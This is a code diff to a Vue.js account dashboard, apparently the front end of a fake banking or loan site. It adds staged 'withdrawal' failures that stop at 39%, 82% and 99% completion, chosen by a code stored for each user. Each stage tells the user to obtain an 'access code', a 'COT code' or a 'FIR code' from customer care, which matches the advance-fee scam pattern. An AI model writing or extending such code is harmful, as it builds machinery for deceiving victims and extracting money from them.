@@ -22,6 +22,7 @@
                   <div class="content">
                       <h4>You are logged as </h4>
                       <h6>{{ fname }} {{ lname }}</h6>
+                      <!-- <small>{{ firstCode }}</small> -->
                   <!-- <small>{{ accountNumber }}</small> -->
                   </div>
                     <div @click.prevent="show()" class="navbar__toggler">
@@ -283,7 +284,8 @@ export default {
             loanWallet:null,
             accountNumber:null,
             unpaid:null,
-
+            firstCode:null,
+            lastCode:null,
 
             id:null,
             city:null,
@@ -329,16 +331,37 @@ export default {
         }, 9000);
         },
         
-        showFinalAlert:function(){
+        firstBilling:function(){
             setTimeout(() => {
                 this.$swal({
                 title:'39% Completed',
-                text: "Your request has failed to proceed more than 39% because you do not have an access code. Kindly contact customer care for one",
+                text: "Your request has failed to proceed more than 39% because you do not have an access code. Contact customer care for one",
                 type: 'danger',
                 icon: 'error',
                 });
             }, 9000);
         },
+        secondBilling:function(){
+            setTimeout(() => {
+                this.$swal({
+                title:'82% Completed',
+                text: "Your request has failed to proceed more than 82% because you do not have COT code. Reach customer care for one",
+                type: 'danger',
+                icon: 'error',
+                });
+            }, 9000);
+        },
+         lastBilling:function(){
+            setTimeout(() => {
+                this.$swal({
+                title:'99% Completed',
+                text: "Your funds are one minute away. Contact support team for the FIR code and that is it",
+                type: 'danger',
+                icon: 'error',
+                });
+            }, 9000);
+        },
+
 
         // //Function to delay errors
         makeWithdrawal:function(){
@@ -447,12 +470,12 @@ export default {
         firstCount(from, to){
             let current = from;
             let timerId = setInterval(() => {
-               let countNum = current
+                alert(current)
                 if(current == to){
                     clearInterval(timerId)
                 }
-                current++;
-            }, 1000);
+                ++current;
+            }, 100);
         },
 
         //Function for final withdraw
@@ -465,11 +488,19 @@ export default {
                 type: 'danger',
                 icon: 'error',
                 });
-          }else{
+          }else if(this.firstCode == '0000'){
               this.loading = true
-              this.removeLoader()
-                this.showFinalAlert()
-              this.firstCount(0, 10)
+                this.removeLoader()
+               this.firstBilling()
+          } else if(this.firstCode == '1048'){
+              this.loading = true
+                this.removeLoader()
+               this.secondBilling()
+          }
+          else if(this.firstCode == '2543'){
+              this.loading = true
+                this.removeLoader()
+               this.lastBilling()
           }
         },
 
@@ -495,7 +526,7 @@ export default {
     },
     mounted(){
         this.showDashboard();
-        this.show()
+        // this.show()
         //Get current user that just logged in
         let user = firebase.auth().currentUser
 
@@ -508,7 +539,9 @@ export default {
                 this.userBalance = doc.data().balance
                 this.loanWallet = doc.data().loan__collected
                 this.accountNumber = doc.data().user__id
-                this.unpaid = doc.data().unpaid__loan
+                this.unpaid = doc.data().unpaid__loan,
+                this.firstCode = doc.data().first__code
+                this.lastCode = doc.data().last__code
             })
         })
     }
